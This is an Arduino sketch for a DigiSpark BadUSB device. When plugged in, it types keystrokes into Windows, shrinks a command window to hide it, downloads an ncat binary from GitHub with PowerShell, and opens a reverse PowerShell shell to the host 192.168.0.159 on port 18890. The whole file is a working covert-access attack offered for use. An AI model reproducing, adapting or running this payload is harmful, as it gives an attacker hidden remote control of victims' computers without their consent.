/*
 * The following code would download a ncat binary from github repo & return a powershell to specific host & port.
*/

#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //start run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //make cmd smallest as possible (Windows 7 working but not Windows 10)
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd %temp%"); //cd to temp directory
  DigiKeyboard.delay(300);  
  DigiKeyboard.println("powershell invoke-webrequest -uri https://github.com/nobodyatall648/ncatBinary/raw/main/ncat.exe -Outfile ncat.exe"); //download ncat binary from my git repo
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("ncat.exe -e powershell 192.168.0.159 18890"); //return reverse shell to 
}

void loop() {
  
  
}
